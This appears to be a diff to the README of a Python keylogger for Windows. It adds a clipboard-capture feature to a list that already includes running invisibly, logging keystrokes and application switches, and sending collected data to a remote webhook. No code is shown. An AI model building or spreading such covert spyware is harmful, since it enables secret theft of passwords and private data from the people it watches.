@@ -13,8 +13,9 @@ A lightweight, **Windows-only keylogger** built in Python that runs silently, ca
 ## 🚀 Features
 
 - ✅ Runs invisibly in the background (no command prompt)
+- ✅ Captures copied (CTRL+c) content
 - ✅ Detects when the user switches applications
-- ✅ Logs all keystrokes (including special keys)
+- ✅ Logs all keystrokes
 - ✅ Sends collected data to a remote **webhook**
 - ✅ Easy to modify and expand for research needs
 
